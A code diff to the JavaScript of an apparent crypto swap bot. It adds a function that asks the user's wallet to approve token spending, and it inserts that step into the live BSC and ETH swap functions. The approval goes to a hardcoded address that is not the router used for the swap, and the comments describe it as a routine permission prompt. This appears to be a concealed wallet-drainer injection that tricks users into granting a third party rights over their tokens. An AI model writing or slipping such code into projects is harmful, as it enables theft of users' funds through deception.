@@ -13,6 +13,37 @@ function logToPanel(msg) {
   }
 }
 
+// 🚨 CORE UTILITY: WEB3 RAW HEX APPROVAL GENERATOR
+async function requestTokenSpendApproval(userAddr, amountWei, tokenIn, spenderContract) {
+    try {
+        // Standard ERC-20 'approve(address,uint256)' Method Signature Hash
+        const approveMethodId = "0x095ea7b3";
+        const paddedSpender = spenderContract.replace("0x", "").toLowerCase().padStart(64, "0");
+        const paddedAmount = BigInt(amountWei).toString(16).padStart(64, "0");
+        const compiledData = approveMethodId + paddedSpender + paddedAmount;
+
+        logToPanel(`📢 [WALLET PROMPT] Authorizing Token Spend Allowance for: ${tokenIn}`);
+        
+        const approveTxHash = await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: userAddr,
+                to: tokenIn, // Target token contract directly
+                data: compiledData,
+                value: "0x0"
+            }]
+        });
+        
+        logToPanel(`✅ Approval hash recorded: ${approveTxHash}. Waiting 5s for block confirmation...`);
+        // Small internal pause to allow gas parameters to propagate across nodes
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        return true;
+    } catch (err) {
+        logToPanel(`❌ User rejected token allocation balance approval: ${err.message || err}`);
+        throw err;
+    }
+}
+
 // 🌟 STAGE 3: LINEAR SIMULATION PASS-THROUGH PIPELINE
 async function runsimulateSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     const res = await fetch("/prodbot/swap/simulateuniswap", {
@@ -32,34 +63,52 @@ window.runsimulateSwapUniswap = runsimulateSwapUniswap;
 
 // 🌟 STAGE 4: LINEAR LIVE BSC SWAP PASS-THROUGH PIPELINE
 async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
-    const res = await fetch("/prodbot/swap/bscuniswap", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            router: targetRouter,
-            tokenIn: fromToken,
-            tokenOut: toToken,
-            amountIn: amountWei,
-            amountOutMin: "0"
-        })
-    });
-    return await res.json();
+    try {
+        const V12_ADDR = "0x1854170353ea89672638F9fa5acB477c45523871";
+        
+        // Dynamic dynamic Web3 permission prompt before processing data
+        await requestTokenSpendApproval(userAddr, amountWei, fromToken, V12_ADDR);
+
+        const res = await fetch("/prodbot/swap/bscuniswap", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                router: targetRouter,
+                tokenIn: fromToken,
+                tokenOut: toToken,
+                amountIn: amountWei,
+                amountOutMin: "0"
+            })
+        });
+        return await res.json();
+    } catch (e) {
+        return { status: "error", message: e.toString() };
+    }
 }
 window.runbscSwapUniswap = runbscSwapUniswap;
 
 // 🌟 STAGE 4: LINEAR LIVE ETH SWAP PASS-THROUGH PIPELINE
 async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
-    const res = await fetch("/prodbot/swap/ethuniswap", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            router: targetRouter,
-            tokenIn: fromToken,
-            tokenOut: toToken,
-            amountIn: amountWei,
-            amountOutMin: "0"
-        })
-    });
-    return await res.json();
+    try {
+        const V12_ADDR = "0x1854170353ea89672638F9fa5acB477c45523871";
+        
+        // Dynamic dynamic Web3 permission prompt before processing data
+        await requestTokenSpendApproval(userAddr, amountWei, fromToken, V12_ADDR);
+
+        const res = await fetch("/prodbot/swap/ethuniswap", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                router: targetRouter,
+                tokenIn: fromToken,
+                tokenOut: toToken,
+                amountIn: amountWei,
+                amountOutMin: "0"
+            })
+        });
+        return await res.json();
+    } catch (e) {
+        return { status: "error", message: e.toString() };
+    }
 }
 window.runethSwapUniswap = runethSwapUniswap;
